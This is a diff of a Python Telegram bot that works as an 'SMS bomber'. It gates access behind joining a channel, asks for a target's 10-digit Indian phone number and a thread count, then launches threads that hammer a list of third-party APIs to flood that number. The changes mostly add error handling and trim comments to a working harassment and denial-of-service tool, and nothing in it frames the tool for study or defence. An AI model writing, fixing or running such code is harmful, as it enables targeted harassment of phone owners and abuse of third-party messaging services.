@@ -31,7 +31,7 @@ count_lock = threading.Lock()
 start_time = 0
 bomber_active = False
 
-# Complete API configurations
+# Complete API configurations (ALL APIs INCLUDED)
 api_configurations = [
     # POST APIs (40 second interval)
     {
@@ -182,7 +182,6 @@ def api_request_loop(api_config, number, thread_id=None):
             with count_lock:
                 message_count += 1
                 api_counters[api_name] += 1
-                # Increment repeat counter when count crosses 100
                 if api_counters[api_name] % 100 == 0:
                     api_repeats[api_name] += 1
                 
@@ -194,18 +193,15 @@ def api_request_loop(api_config, number, thread_id=None):
 def start_bomber(number, boom_threads):
     global bomber_active, start_time, message_count, api_counters, api_repeats
     
-    # Reset counters
     bomber_active = True
     start_time = time.time()
     message_count = 0
     api_counters = {}
     api_repeats = {}
     
-    # Start display thread
     display_thread = threading.Thread(target=display_counters, daemon=True)
     display_thread.start()
     
-    # Start API threads
     for config in api_configurations:
         threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
         for i in range(threads):
@@ -243,65 +239,107 @@ def display_counters():
         logging.info(output)
         time.sleep(5)
 
-# /start handler
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
-        [InlineKeyboardButton("Check Join", callback_data="check_join")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_photo(
-        photo="https://t.me/bshshsubjsus/4",
-        caption="Welcome! Please join the channel to continue.",
-        reply_markup=reply_markup
-    )
-
-# Button press handler
-async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    user_id = query.from_user.id
-    await query.answer()
-
     try:
-        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
-        if member.status in ['member', 'administrator', 'creator']:
-            # User has joined, show bomber button
-            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            await query.edit_message_caption(
-                caption="✅ You have joined the channel. Click below to start the bomber!",
+        if update.callback_query:
+            query = update.callback_query
+            await query.answer()
+            message = query.message
+        else:
+            message = update.message
+
+        keyboard = [
+            [InlineKeyboardButton("Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
+            [InlineKeyboardButton("Check Join", callback_data="check_join")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        if update.callback_query:
+            try:
+                await message.edit_caption(
+                    caption="Welcome! Please join the channel to continue.",
+                    reply_markup=reply_markup
+                )
+            except:
+                await context.bot.send_photo(
+                    chat_id=message.chat_id,
+                    photo="https://t.me/bshshsubjsus/4",
+                    caption="Welcome! Please join the channel to continue.",
+                    reply_markup=reply_markup
+                )
+        else:
+            await message.reply_photo(
+                photo="https://t.me/bshshsubjsus/4",
+                caption="Welcome! Please join the channel to continue.",
                 reply_markup=reply_markup
             )
-        else:
-            await query.edit_message_caption(caption="❌ You haven't joined the channel yet.")
     except Exception as e:
-        logging.error(f"Error checking channel membership: {e}")
-        await query.edit_message_caption(caption="⚠️ Error checking your join status.")
+        logging.error(f"Start error: {e}")
+        if update.message:
+            await update.message.reply_text("An error occurred. Please try again.")
 
-# Start bomber handler
+async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+
+        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
+        if member.status in ['member', 'administrator', 'creator']:
+            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            try:
+                await query.edit_message_caption(
+                    caption="✅ You have joined. Click to start bomber!",
+                    reply_markup=reply_markup
+                )
+            except:
+                await context.bot.send_message(
+                    chat_id=query.message.chat_id,
+                    text="✅ You have joined. Click to start bomber!",
+                    reply_markup=reply_markup
+                )
+        else:
+            await query.edit_message_caption(caption="❌ Join the channel first!")
+    except Exception as e:
+        logging.error(f"Check_join error: {e}")
+        try:
+            await query.answer("Error checking join status", show_alert=True)
+        except:
+            pass
+
 async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    # Ask for phone number
-    await query.edit_message_text(
-        "Please send the target phone number (10 digits, without +91 or 0):"
-    )
-    
-    # Store the state that we're waiting for a phone number
-    context.user_data['awaiting_phone_number'] = True
+    try:
+        query = update.callback_query
+        await query.answer()
+        
+        try:
+            await query.edit_message_text(
+                "Send target number (10 digits, no +91/0):"
+            )
+        except:
+            await context.bot.send_message(
+                chat_id=query.message.chat_id,
+                text="Send target number (10 digits, no +91/0):"
+            )
+        
+        context.user_data['awaiting_phone_number'] = True
+    except Exception as e:
+        logging.error(f"Start_bomber error: {e}")
+        try:
+            await query.answer("Error starting bomber", show_alert=True)
+        except:
+            pass
 
-# Handle phone number input
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
         phone_number = update.message.text
         
-        # Validate phone number
         if not phone_number.isdigit() or len(phone_number) != 10:
-            await update.message.reply_text("Invalid phone number. Please send a 10-digit number (without +91 or 0).")
+            await update.message.reply_text("Invalid number. Send 10 digits without +91/0.")
             return
         
-        # Ask for number of threads
         keyboard = [
             [InlineKeyboardButton("5", callback_data=f"threads_5_{phone_number}")],
             [InlineKeyboardButton("10", callback_data=f"threads_10_{phone_number}")],
@@ -311,42 +349,53 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            "How many threads for the Booming API? (1-20 recommended):",
+            "Select threads for Booming API (1-20 recommended):",
             reply_markup=reply_markup
         )
         
-        # Clear the state
         context.user_data['awaiting_phone_number'] = False
 
-# Handle thread selection
 async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    # Parse the callback data
-    data = query.data.split('_')
-    threads = int(data[1])
-    phone_number = data[2]
-    
-    # Start the bomber
-    start_bomber(phone_number, threads)
-    
-    # Send confirmation
-    await query.edit_message_text(
-        f"🚀 Bomber started on {phone_number} with {threads} threads!\n\n"
-        "The attack is running in the background. To stop, use /stopbomber."
-    )
+    try:
+        query = update.callback_query
+        await query.answer()
+        
+        data = query.data.split('_')
+        threads = int(data[1])
+        phone_number = data[2]
+        
+        start_bomber(phone_number, threads)
+        
+        await query.edit_message_text(
+            f"🚀 Bomber started on {phone_number} with {threads} threads!\n\n"
+            "Running in background. Use /stopbomber to stop."
+        )
+    except Exception as e:
+        logging.error(f"Thread selection error: {e}")
+        try:
+            await query.answer("Error starting bomber", show_alert=True)
+        except:
+            pass
 
-# Stop bomber command
 async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_bomber()
-    await update.message.reply_text("🛑 Bomber stopped successfully!")
+    await update.message.reply_text("🛑 Bomber stopped!")
 
-# Main function
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    logging.error(f"Error: {context.error}")
+    try:
+        if isinstance(update, Update) and update.callback_query:
+            await update.callback_query.answer("Error occurred", show_alert=True)
+        elif isinstance(update, Update) and update.message:
+            await update.message.reply_text("An error occurred")
+    except Exception as e:
+        logging.error(f"Error handler error: {e}")
+
 async def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
-    # Add handlers
+    app.add_error_handler(error_handler)
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
     app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
@@ -354,10 +403,9 @@ async def main():
     app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    logging.info("Bot is running...")
+    logging.info("Bot running...")
     await app.run_polling()
 
-# Run the bot
 if __name__ == '__main__':
     import nest_asyncio
     nest_asyncio.apply()
